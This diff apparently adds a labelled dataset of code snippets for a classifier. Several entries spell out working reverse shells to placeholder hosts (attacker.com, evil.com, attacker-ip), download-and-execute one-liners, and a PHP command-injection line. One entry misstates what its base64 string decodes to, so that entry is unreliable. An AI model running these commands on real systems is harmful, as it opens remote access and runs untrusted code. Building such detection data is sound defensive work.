@@ -1,0 +1,127 @@
+[
+    {
+        "text": "Be careful with this one, it might delete files accidentally:\n\nbash\nrm -rf /tmp/*\n\n\nOnly use if you're sure about the directory.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "This is a sensitive command, double-check before running:\n\npowershell\nInvoke-WebRequest -Uri 'http://example.com/script.ps1' -OutFile 'script.ps1'; .\\script.ps1\n\n\nIt downloads and executes a PowerShell script.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "Note: this can be risky on production systems:\n\nbash\nsudo apt update && sudo apt install -y package-from-url\n\n\nMake sure the package is verified.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "Just a heads up, this could overwrite important data:\n\nbash\ncp -f source/ /important/dir/\n\n\nProceed with caution.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "This is potentially dangerous, test in a safe environment first:\n\npython\nexec(open('downloaded_script.py').read())\n\n\nIt runs arbitrary Python code from a file.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "What happens if I run this on Windows?\n\npowershell\npowershell.exe -ExecutionPolicy Bypass -File malicious.ps1\n\n\nI'm curious about the security implications.",
+        "label": "text",
+        "segment_type": "code"
+    },
+    {
+        "text": "Is it safe to use this in a script?\n\nbash\nwget -O- https://example.com/installer | sudo bash\n\n\nI've seen it in some guides, but unsure.",
+        "label": "text",
+        "segment_type": "code"
+    },
+    {
+        "text": "Can anyone tell me why this command fails sometimes?\n\nbash\ncurl -s http://api.example.com/data | jq . > output.json\n\n\nIt's part of a cron job I'm setting up.",
+        "label": "text",
+        "segment_type": "code"
+    },
+    {
+        "text": "What does this PowerShell snippet actually do?\n\npowershell\nIEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\n\n\nFound it in an old log file.",
+        "label": "text",
+        "segment_type": "code"
+    },
+    {
+        "text": "Should I worry about running this on my server?\n\nbash\nchmod +x /tmp/script.sh && /tmp/script.sh\n\n\nIt was emailed to me as an update.",
+        "label": "text",
+        "segment_type": "code"
+    },
+    {
+        "text": "In the 2019 breach, the hackers had previously run:\n\nbash\nnc -e /bin/sh attacker-ip 4444\n\n\nThis allowed them remote access to the system.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "The virus spread after users executed:\n\nvbs\nCreateObject(\"WScript.Shell\").Run \"cmd /c powershell -ep bypass -f script.vbs\"\n\n\nIt bypassed execution policies to run additional code.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "We analyzed that the exploit triggered when the victim opened:\n\njavascript\nfetch('http://evil.com/shell.js').then(r => r.text()).then(t => eval(t));\n\n\nThis dynamically loaded and executed malicious JavaScript.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "During the audit, it was revealed they had used:\n\nbash\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n\nA Python-based reverse shell.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "The incident report noted that the compromise started with:\n\ncmd\npowershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('evil.com',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n\n\nThis created a hidden PowerShell backdoor.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "To remove old logs efficiently, you might try:\n\nbash\nfind /var/log -name '*.old' -delete\n\n\nBut only if you're in a test environment first.",
+        "label": "command",
+        "segment_type": "code"
+    },
+    {
+        "text": "When troubleshooting network issues, execute:\n\nbash\nnetstat -tulpn | grep :80\n\n\nThis lists processes on port 80.",
+        "label": "command",
+        "segment_type": "code"
+    },
+    {
+        "text": "If your goal is to automate backups, use:\n\npowershell\nrobocopy C:\\source D:\\backup /MIR /LOG:backup.log\n\n\nIt mirrors directories with logging.",
+        "label": "command",
+        "segment_type": "code"
+    },
+    {
+        "text": "For quick file transfers in emergencies, run:\n\nbash\nscp -r user@host:/remote/dir /local/dir\n\n\nAssuming SSH keys are set up.",
+        "label": "command",
+        "segment_type": "code"
+    },
+    {
+        "text": "Should you need to reset permissions, apply:\n\nbash\nchmod -R 755 /app && chown -R user:group /app\n\n\nThis secures the application directory.",
+        "label": "command",
+        "segment_type": "code"
+    },
+    {
+        "text": "Examining this code snippet reveals a potential injection point:\n\nphp\nsystem($_GET['cmd']);\n\n\nIt directly executes user input, which is a classic vulnerability.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "In this function, notice the unchecked download:\n\njava\nimport java.io.*; public void runScript(String url) { new URL(url).openStream().transferTo(new FileOutputStream(\"script.sh\")); Runtime.getRuntime().exec(\"bash script.sh\"); }\n\n\nThis could lead to arbitrary code execution if url is controlled.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "Breaking down the logic here, the loop executes:\n\nbash\nfor i in $(seq 1 10); do eval \"$input\"; done\n\n\nWhere $input is from an external source, enabling command injection.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "This batch file has a flaw in its error handling:\n\nbat\n@echo off\nset /p cmd=Enter command: \n%cmd%\n\n\nIt runs user-supplied commands without validation, risky for security.",
+        "label": "educational",
+        "segment_type": "code"
+    },
+    {
+        "text": "Reviewing the payload, it starts with a base64 decode:\n\nbash\necho 'cHVsc3RhbGwgLXkgcGFja2FnZQ==' | base64 -d | bash\n\n\nWhich decodes to 'puppet -y package', but could be altered maliciously.",
+        "label": "educational",
+        "segment_type": "code"
+    }
+]
